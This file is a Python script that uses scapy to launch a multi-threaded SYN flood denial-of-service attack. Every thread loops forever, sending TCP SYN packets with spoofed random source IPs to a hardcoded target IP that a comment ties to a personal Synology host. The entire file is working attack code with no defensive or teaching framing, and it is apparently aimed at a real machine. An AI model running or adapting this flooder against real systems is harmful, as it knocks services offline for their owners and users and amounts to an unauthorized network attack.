import string
from scapy.all import * 
from threading import Thread 

class synflood(Thread): 
    def __init__(self, dst_IP, dst_port, run_thread): 
        Thread.__init__(self) 
        self.dst_IP = dst_IP 
        self.dst_PORT = dst_port 

        self.running=True 

        self.intercount=0 

        self.data=(string.ascii_letters + string.digits)*10 

    def run(self): 
        while self.running: 
            self.synf=IP(src=RandIP(), dst=self.dst_IP,len=65535)/TCP(flags='S',sport=RandShort(),dport=self.dst_PORT) 
            send(self.synf)
            print('Packet Sent :' + str(self.intercount)) 
            self.intercount+=1 


def main():
    # http://paullab.synology.me/
    dst_IP = '118.43.233.147'
    dst_PORT = int(input('Destination PORT[num] : ')) 
    run_thread = int(input('Run Thread[num] : ')) 
    rthread=[] 
    for SF in range(run_thread): 
        print('start')
        SF=synflood(dst_IP, dst_PORT, run_thread) 
        rthread.append(SF) 
        SF.start()
        print('end')
    print(rthread)

if __name__ == '__main__':
    main()